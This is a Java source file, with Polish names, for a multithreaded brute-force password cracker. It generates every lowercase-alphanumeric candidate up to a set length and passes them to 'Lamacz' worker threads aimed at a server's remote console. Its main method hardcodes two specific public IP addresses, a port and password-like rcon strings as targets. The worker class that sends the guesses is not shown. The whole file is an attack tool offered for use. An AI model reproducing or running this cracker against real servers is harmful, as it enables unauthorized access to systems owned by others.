
package breakpass;

import java.lang.management.GarbageCollectorMXBean;
import java.util.ArrayList;

public class Koordynator {

	public int timeouty = 0;

	public ArrayList<Lamacz> watki = new ArrayList<Lamacz>();

	public int aktualny = 0;
	public void exit() {
		System.exit(0);
	}
	public  void start(String ip, int port, String rcon, int length,
			int LiczbaWatkow) {

		// String charset = "abcdefghijklmnopqrstuvwxyz";

		ArrayList<ArrayList<String>> listaWszystkich = new ArrayList<ArrayList<String>>();

		for (int i = 0; i < LiczbaWatkow; i++) {
			listaWszystkich.add(new ArrayList<String>());
		}

		char[] ctab = "0123456789abcdefghijklmnopqrstuvwxyz".toCharArray();
		int ilosc_znakow = ctab.length;

		int[] tab = new int[length + 1];

		for (int i = 0; i < length; i++)
			tab[i] = 0;

		boolean koniec = false;

		tab[0] = -1;

		int aktualnaLista = 0;

		while (koniec != true) {
			tab[0]++; // zwiekszamy sobie tak jakby cyfrę jednosci

			// sprawdzamy czy ta zwiekszona cyfra jednosci, nie jest za duza,
			// jesli tak, to zerujemy sobie ja i przenosimy na pozycje wyzsza
			for (int i = 0; i < length; i++) {
				if (tab[length - 1] == ilosc_znakow)
					koniec = true;

				if (tab[i] > ilosc_znakow - 1) {
					tab[i + 1]++;
					tab[i] = 0;

				}
			}

			if (koniec == true)
				continue;

			// wypisujemy fraze
			String s = "";

			s = "";

			for (int i = length - 1; i >= 0; i--) {

				// s += ctab[tab[i]];

				// System.out.print(ctab[tab[i]]);
				s += ctab[tab[i]];
			}
			// System.out.println(s);

			if (aktualnaLista >= LiczbaWatkow)
				aktualnaLista = 0;

			listaWszystkich.get(aktualnaLista).add(s);

			aktualnaLista++;

		}

		System.out.println("Odpalam wątki");

		
		

	int id=0;
		
		for (ArrayList<String> l : listaWszystkich) {
			System.out.println(l.size());
			id++;
			watki.add(new Lamacz(id,this,  ip, port,rcon,l));
			
		}
		
		
		for (Lamacz d : watki) {

			Thread t = new Thread(d);
			t.start();
		}

	}

	public static void main(String[] args) {
		// TODO Auto-generated method stub

		Koordynator k= new Koordynator();
		k.start("39.59.1.211", 26001, "Lumia663", 4, 100);
		//k.start("182.178.251.212", 26001, "%vsxd511%",1, 3);

		
		
	}

}
